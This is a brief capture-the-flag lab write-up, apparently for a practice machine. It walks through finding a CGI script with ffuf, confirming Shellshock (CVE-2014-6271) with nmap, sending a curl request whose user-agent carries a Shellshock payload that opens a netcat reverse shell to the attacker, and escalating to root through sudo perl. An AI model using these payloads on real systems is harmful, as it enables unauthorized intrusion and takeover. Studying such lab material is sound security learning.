### Foothold
403 get the CGI existed. Then easy to found some resources

https://book.hacktricks.xyz/pentesting/pentesting-web/cgi

https://github.com/opsxcq/exploit-CVE-2014-6271

##### Hard part is looking for a vuln path
```
# Nothing worse than try everything. But things happened here. Have to find the entry with unusual extensions
ffuf -u http://10.10.10.56/cgi-bin/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .sh,.cgi,.pl -fc 403

# Verify it
nmap 10.x.x.x -p 80 --script=http-shellshock --script-args uri=/cgi-bin/path_been_found
```
##### Get the reverses shell
```
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.x.x 4242 >/tmp/f'" \
http://10.10.10.56:80/cgi-bin/user.sh
```

### Priv
```
sudo -l
sudo perl -e 'exec "/bin/sh";'
```